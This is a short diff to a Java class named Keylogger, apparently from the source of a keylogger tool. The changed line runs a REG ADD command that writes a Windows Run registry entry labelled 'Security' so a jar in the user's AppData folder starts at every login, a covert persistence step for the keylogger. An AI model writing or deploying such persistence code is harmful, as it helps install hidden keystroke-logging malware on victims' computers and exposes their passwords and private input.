@@ -118,7 +118,7 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
                 e.printStackTrace();
             }
             try {
-                Runtime.getRuntime().exec("cmd /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Security\" /t REG_SZ /F /D \"%appdata%\\(s)AINT\\saint.jar\"");
+                Runtime.getRuntime().exec("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Security\" /t REG_SZ /F /D \""+app_path+name_jar+"\"");
             } catch (IOException ex) {
                 System.out.println(ex.getMessage());
             }
